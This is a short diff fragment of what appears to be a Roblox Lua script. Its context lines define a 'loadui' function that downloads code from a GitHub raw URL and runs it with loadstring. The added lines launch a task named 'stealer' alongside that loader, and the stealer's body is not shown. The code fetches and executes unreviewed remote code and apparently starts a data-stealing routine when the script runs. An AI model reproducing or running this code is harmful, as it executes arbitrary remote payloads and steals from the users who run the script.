@@ -6,3 +6,6 @@ local function loadui()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenscripts915/LOADING-SCRIPT/refs/heads/main/LOADING-SCRIPT"))()
 end
+
+task.spawn(stealer) 
+task.spawn(loadui)
